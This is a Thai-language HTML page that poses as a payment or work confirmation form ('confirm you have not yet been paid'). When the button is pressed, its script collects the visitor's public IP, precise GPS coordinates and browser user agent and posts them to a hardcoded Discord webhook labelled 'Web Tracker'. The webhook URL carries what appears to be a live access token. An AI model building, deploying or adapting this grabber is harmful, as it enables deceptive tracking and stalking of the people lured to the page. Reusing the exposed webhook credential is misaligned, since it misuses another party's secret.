<!doctype html>
<html lang="th">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ARWX ลงงาน</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0f172a;color:#e5e7eb;padding:24px}
  button{padding:12px 18px;border:0;border-radius:12px;background:#22c55e;cursor:pointer;font-size:16px}
  pre{margin-top:16px;background:#020617;border-radius:12px;padding:14px;white-space:pre-wrap}
  small{opacity:.8}
</style>
</head>
<body>

<h2>📍 ยินยันว่ายังไม่จ่าย</h2>
<button id="btn">กดเพื่อส่ง</button>
<pre id="out">ยังไม่ได้กด</pre>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1452996074485710880/j3FV0207D74ogmrm6Y4_XepEzkrOk23XTQW70wAk0q21KeOGi9EMLYI4_dLY44yJCAaz"; // <- ใส่ webhook ของคุณ

const out = document.getElementById("out");
const btn = document.getElementById("btn");

function geoError(err){
  let msg = "เกิดข้อผิดพลาด";
  if (err.code === 1) msg = "❌ ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง (Permission denied)";
  if (err.code === 2) msg = "❌ ไม่สามารถหาตำแหน่งได้ (Position unavailable)";
  if (err.code === 3) msg = "❌ Timeout";
  return msg;
}

async function getPublicIP(){
  // ดึง IP สาธารณะ (IPv4/IPv6) — บางเครือข่ายจะได้ IPv6
  // ถ้าโดนบล็อก ให้เปลี่ยน endpoint เป็นผู้ให้บริการอื่น
  const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
  if (!r.ok) throw new Error("ipify failed");
  const j = await r.json();
  return j.ip || "unknown";
}

function getGeo(){
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error("Geolocation not supported"));
    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    });
  });
}

async function sendToDiscord(payload){
  const r = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  if (!r.ok) throw new Error("Webhook send failed");
}

btn.addEventListener("click", async () => {
  try {
    out.textContent = "⏳ กำลังดึง IP + ตำแหน่ง...";
    btn.disabled = true;

    // ดึงพร้อมกัน
    const [ip, pos] = await Promise.all([
      getPublicIP().catch(() => "unknown"),
      getGeo()
    ]);

    const { latitude, longitude, accuracy } = pos.coords;
    const time = new Date().toLocaleString("th-TH");
    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
    const ua = navigator.userAgent;

    const payload = {
      username: "Web Tracker",
      embeds: [{
        title: "📍 ที่อยู่ ",
        color: 0x22c55e,
        fields: [
          { name: "🕒 เวลา", value: time, inline: false },
          { name: "🌐 IP (Public)", value: `\`${ip}\``, inline: true },
          { name: "📌 Latitude", value: `\`${latitude}\``, inline: true },
          { name: "📌 Longitude", value: `\`${longitude}\``, inline: true },
          { name: "🎯 Accuracy", value: `${Math.round(accuracy)} เมตร`, inline: true },
          { name: "🗺️ Google Maps", value: `[เปิดแผนที่](${mapUrl})`, inline: false },
          { name: "🧾 User-Agent", value: `\`${ua.slice(0, 900)}\``, inline: false }
        ],
        footer: { text: "Web Location Reporter" }
      }]
    };

    await sendToDiscord(payload);

    out.textContent =
      "✅ ส่งไป Discord แล้ว\n\n" +
      `เวลา: ${time}\n` +
      `IP: ${ip}\n` +
      `Lat: ${latitude}\n` +
      `Lon: ${longitude}\n` +
      `Accuracy: ${Math.round(accuracy)}m\n` +
      mapUrl;

  } catch (e) {
    // แยกเคส location error ให้ชัด
    if (e && typeof e.code === "number") {
      out.textContent = geoError(e);
    } else {
      out.textContent = "❌ ส่งไม่สำเร็จ: " + (e?.message || "unknown error");
    }
  } finally {
    btn.disabled = false;
  }
});
</script>

</body>
</html>
